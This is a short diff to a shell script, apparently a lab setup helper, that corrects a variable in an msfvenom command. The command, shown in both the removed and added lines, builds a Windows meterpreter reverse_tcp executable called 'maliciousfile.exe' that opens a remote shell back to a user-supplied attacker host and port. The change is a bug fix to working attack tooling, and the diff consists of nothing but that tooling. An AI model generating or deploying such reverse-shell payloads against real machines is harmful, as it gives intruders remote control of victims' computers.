@@ -10,6 +10,6 @@ read Lport
 
 echo "Generating payloads..."
 
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$Lhost LPORT=Lport -f exe -o maliciousfile.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport -f exe -o maliciousfile.exe
 
 chmod +x dolab.sh
